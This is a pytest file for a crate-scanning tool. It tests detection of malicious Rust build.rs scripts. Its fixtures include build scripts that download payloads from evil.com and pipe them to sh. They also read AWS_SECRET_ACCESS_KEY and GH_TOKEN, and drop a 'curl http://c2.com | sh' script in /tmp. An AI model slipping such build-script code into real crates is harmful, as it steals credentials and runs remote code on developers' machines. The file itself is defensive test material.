# SPDX-License-Identifier: AGPL-3.0-or-later
from pathlib import Path
from pkgsentry.ecosystems.crates.build_rs import analyze_build_rs


def _write_crate(tmp_path: Path, build_rs_content: str) -> Path:
    """Create a fake extracted crate with the given build.rs."""
    crate_dir = tmp_path / "foo-1.0.0"
    crate_dir.mkdir(parents=True)
    (crate_dir / "Cargo.toml").write_text('[package]\nname = "foo"')
    (crate_dir / "build.rs").write_text(build_rs_content)
    return tmp_path


def test_clean_build_rs_no_findings(tmp_path):
    root = _write_crate(tmp_path, 'fn main() { println!("cargo:rerun-if-changed=build.rs"); }')
    findings = analyze_build_rs(root)
    assert len(findings) == 0


def test_network_call_in_build_rs(tmp_path):
    root = _write_crate(tmp_path, """
    use reqwest;
    fn main() {
        let body = reqwest::blocking::get("http://evil.com/payload").unwrap();
    }
    """)
    findings = analyze_build_rs(root)
    assert any(f.rule_id == "crates.build_rs_network" for f in findings)


def test_command_execution_in_build_rs(tmp_path):
    root = _write_crate(tmp_path, """
    use std::process::Command;
    fn main() {
        Command::new("curl").arg("http://evil.com").output().unwrap();
    }
    """)
    findings = analyze_build_rs(root)
    assert any(f.rule_id == "crates.build_rs_exec" for f in findings)


def test_env_harvesting_in_build_rs(tmp_path):
    root = _write_crate(tmp_path, """
    fn main() {
        let home = std::env::var("HOME").unwrap();
        let key = std::env::var("AWS_SECRET_ACCESS_KEY").unwrap();
        let ssh = std::env::var("SSH_AUTH_SOCK").unwrap();
        let token = std::env::var("GH_TOKEN").unwrap();
    }
    """)
    findings = analyze_build_rs(root)
    assert any(f.rule_id == "crates.build_rs_env_harvest" for f in findings)


def test_outdir_escape_in_build_rs(tmp_path):
    root = _write_crate(tmp_path, """
    use std::fs;
    fn main() {
        fs::write("/tmp/evil.sh", "#!/bin/sh\\ncurl http://c2.com | sh");
    }
    """)
    findings = analyze_build_rs(root)
    assert any(f.rule_id == "crates.build_rs_outdir_escape" for f in findings)


def test_network_plus_exec_chain_is_critical(tmp_path):
    root = _write_crate(tmp_path, """
    use reqwest;
    use std::process::Command;
    fn main() {
        let body = reqwest::blocking::get("http://evil.com/payload").unwrap().text().unwrap();
        Command::new("sh").arg("-c").arg(&body).output().unwrap();
    }
    """)
    findings = analyze_build_rs(root)
    chain = [f for f in findings if f.rule_id == "crates.build_rs_net_exec_chain"]
    assert len(chain) == 1
    assert chain[0].severity == "critical"


def test_no_build_rs_no_findings(tmp_path):
    """Crate without build.rs -- no findings from this analyzer."""
    crate_dir = tmp_path / "simple-1.0.0"
    crate_dir.mkdir(parents=True)
    (crate_dir / "Cargo.toml").write_text('[package]\nname = "simple"')
    (crate_dir / "src").mkdir()
    (crate_dir / "src" / "lib.rs").write_text("pub fn hello() {}")
    findings = analyze_build_rs(tmp_path)
    assert len(findings) == 0
